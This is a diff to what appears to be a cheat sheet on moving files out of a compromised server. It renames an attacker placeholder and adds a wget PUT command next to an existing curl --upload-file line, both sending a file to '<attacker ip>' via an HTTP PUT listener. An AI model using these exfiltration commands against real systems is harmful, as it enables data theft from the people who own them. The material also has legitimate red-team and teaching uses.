@@ -15,7 +15,6 @@ scp tester@192.168.10.99:/Users/tester/Desktop/123.txt /tmp/123.txt
 HTTPutServer.py
 
 ```
-# ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server
 import sys
 import signal
 from threading import Thread
@@ -58,11 +57,15 @@ if __name__ == "__main__":
 Starting server 
 
 ```
-python HTTPutServer.py <attacker host> <attacker port>
+python HTTPutServer.py <attacker ip> <attacker port>
 ```
 
 Target server uploads data
 
 ```
-curl --upload-file test.txt http://<attacker host>:<attacker port>/
+curl --upload-file test.txt http://<attacker ip>:<attacker port>/
+```
+
+```
+wget --method=PUT --post-file=test.txt http://<attacker ip>:<attacker port>/
 ```
